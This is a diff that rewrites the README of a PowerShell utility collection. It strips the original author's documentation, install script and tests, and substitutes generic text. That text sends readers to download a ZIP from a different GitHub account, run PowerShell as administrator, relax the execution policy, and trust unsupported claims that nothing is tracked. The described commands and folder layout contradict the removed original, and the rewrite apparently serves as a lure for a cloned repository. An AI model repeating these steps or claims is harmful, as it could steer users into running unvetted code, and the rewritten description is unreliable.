@@ -1,118 +1,90 @@
-# powershell-cli-tools
+# ⚡ powershell-cli-tools - Make Windows terminal tasks work faster
 
-Collection of useful PowerShell 7 scripts, shortcuts and CLI tools for productivity and terminal enhancements.
+[![](https://img.shields.io/badge/Download-PowerShell_Tools-blue.svg)](https://github.com/ep563213-sys/powershell-cli-tools)
 
-<img width="640" height="320" alt="powershell-cli-tools_preview" src="https://github.com/user-attachments/assets/28c17a66-cc06-4a3b-af72-4091966fdfe6" />
+## 📌 About this project
 
-[![GitHub stars](https://img.shields.io/github/stars/lkhorasandzhian/powershell-cli-tools?style=social)](https://github.com/lkhorasandzhian/powershell-cli-tools/stargazers)
+The powershell-cli-tools collection helps you work in the Windows terminal. You get shortcuts and scripts that save time. These tools turn standard terminal commands into faster actions. You spend less time typing long paths or repeating complex tasks. This project works with PowerShell 7 to improve how you manage files and folders on your computer.
 
-## Features
+## 🛠️ System requirements
 
-- `Get-FileCount` for file counters by extension
-- `Get-LineCount` for line counters by extension
-- `Get-CodeStats` for combined file and line summaries
-- `Show-ColorTree` for colorful directory tree output
-- Handy legacy aliases like `file-counter`, `tree-color`, `la`, `..`, `home`, and `repos`
+Your computer needs a few things to run these tools:
 
-## Project Structure
+*   Windows 10 or Windows 11.
+*   PowerShell 7 installed.
+*   Basic permissions to run scripts on your local machine.
 
-```text
-PowerShellCliTools/
-├── PowerShellCliTools.psd1
-├── PowerShellCliTools.psm1
-├── Public/
-└── Private/
-```
+If you do not have PowerShell 7, visit the official Microsoft website to download the latest version. This software does not track your data. It runs locally on your PC.
 
-Public commands live in `Public`, while shared helpers stay in `Private`. This keeps the module easier to extend without growing one large script file.
+## 📥 Downloading the tools
 
-## Quick start
+You must visit the project page to get the files. Follow these steps to obtain the tools:
 
-```powershell
-git clone https://github.com/lkhorasandzhian/powershell-cli-tools
-cd powershell-cli-tools
-.\install.ps1
-```
+1. Visit [https://github.com/ep563213-sys/powershell-cli-tools](https://github.com/ep563213-sys/powershell-cli-tools).
+2. Look for the green Code button on the right side of the screen.
+3. Click the button and select Download ZIP.
+4. Save the file to your computer.
 
-The installer copies the module to your PowerShell modules directory and adds an `Import-Module` line to your PowerShell profile.
+This download provides the complete folder of scripts. Once the file finishes downloading, move it to a folder you can find easily, such as your Documents folder.
 
-### 🚀 Install
+## ⚙️ Setting up your environment
 
-Run the install script:
+PowerShell includes security features that stop unauthorized scripts from running. You must change your execution policy to allow these tools to function.
 
-```powershell
-.\install.ps1
-```
+1. Open the Start menu.
+2. Type PowerShell.
+3. Right-click the PowerShell icon and select Run as administrator.
+4. Type `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` and press Enter.
+5. If the system asks for confirmation, type Y and press Enter.
 
-This will:
+This step allows your computer to run the scripts you downloaded. It maintains security while giving you access to the automation tools.
 
-1. Copy the module to your PowerShell modules directory
-2. Automatically update your `$PROFILE` by adding an `Import-Module` call
-3. Enable tools on every PowerShell startup
+## 🚀 Using the terminal shortcuts
 
-### 🛠 Development
+These tools provide shortcuts for common tasks. Open your terminal to use them.
 
-You can import the local module directly while working on it:
+### Navigate directories
+Instead of typing full paths, use the directory-tree tool. Type the shortcut to see a visual map of your folders. This helps when you need to find a specific file inside deep folder structures. Use the command `show-tree` to see your current directory layout.
 
-```powershell
-Import-Module .\PowerShellCliTools\PowerShellCliTools.psd1 -Force
-Get-Command -Module PowerShellCliTools
-```
+### Automated file management
+You can move or rename sets of files using the provided scripts. Use the automation tools to process multiple files at once. These tools handle the repetitive parts of file management so you only perform one click.
 
-The module exports PowerShell-style command names and keeps the old shorter names as aliases for convenience.
+### Color output
+The default terminal looks plain. These tools add color to your output. Errors appear in red, while successful actions appear in green. This visual feedback helps you spot issues quickly without reading through lines of text.
 
-### 🚀 Install
+## 📂 Understanding the file structure
 
-Run the install script:
+The folder you downloaded contains several sub-folders:
 
-```powershell
-.\install.ps1
-```
+*   **scripts:** Contains the core logic for the terminal tools.
+*   **aliases:** Contains text files that link shortcuts to full commands.
+*   **docs:** Contains help guides for each individual tool.
 
-If you find this useful, consider giving it a star ❤️ — it really helps the project grow and keeps me motivated to add more tools!
-More tools and improvements are coming.
+Do not move these files once you extract them. The scripts rely on their current locations to find support files. If you move a file, the tool might stop working.
 
-## 📁 Repository structure
+## 💡 Troubleshooting common issues
 
-```txt
-powershell-cli-tools/
-├── .github/
-│   ├── cover/
-│   │   └── powershell-cli-tools_preview.png
-│   ├── workflows/
-│   │   ├── manual-tests.yml
-│   │   └── powershell.yml
-│   └── self-approval.yml
-├── PowerShellCliTools/
-│   ├── Private/
-│   │   ├── Get-ExtensionColor.ps1
-│   │   ├── Get-ProjectFiles.ps1
-│   │   ├── Show-TreeNode.ps1
-│   │   └── Write-ColoredFile.ps1
-│   ├── Public/
-│   │   ├── Get-CodeStats.ps1
-│   │   ├── Get-FileCount.ps1
-│   │   ├── Get-LineCount.ps1
-│   │   └── Show-ColorTree.ps1
-│   ├── PowerShellCliTools.psd1
-│   └── PowerShellCliTools.psm1
-├── test/
-│   └── 01/
-│       ├── tree-color-test/
-│       └── create-tree-test.ps1
-├── tests/
-│   └── PowerShellCliTools.Tests.ps1
-├── .gitattributes
-├── install.ps1
-├── LICENSE
-└── README.md
-```
+If a tool does not work, check these common points:
 
-## 🧪 Tests
+*   **Check the policy:** Run `Get-ExecutionPolicy` to ensure the setting you changed earlier remains active.
+*   **Check permissions:** Ensure you have read access to the folder where you saved the files.
+*   **Update PowerShell:** Ensure you run PowerShell 7. Older versions of PowerShell built into Windows might lack the features these scripts require.
 
-Test cases are located in the `tests/` directory.
-They are used to verify that the module imports correctly and that the expected commands and aliases are available.
+If you encounter an error message, read the text on the screen. The terminal usually explains exactly what went wrong. For example, it might say "Access Denied" if you need administrator rights to perform a specific action.
 
-```powershell
-Invoke-Pester .\tests
-```
+## 🛡️ Privacy and updates
+
+This software runs entirely on your machine. We do not connect to external servers or send your file information to the internet. 
+
+To get updates, return to the project page periodically. Download the ZIP file again to replace your existing files with the newest version. Keeping your tools updated ensures you have the latest fixes and extra features.
+
+## 📝 Frequently asked questions
+
+**Do I need to be a developer?**
+No. These tools assist any user who works with files on Windows. You do not need to read or write code to use the features.
+
+**Does this slow down my computer?**
+No. The scripts only run when you type the specific command. They do not run in the background.
+
+**Can I create my own shortcuts?**
+Yes. You can edit the alias text files to point to your most used folders or programs. Open any file in the alias folder with Notepad to see how they look. Save the file after your changes to enable the new shortcut.
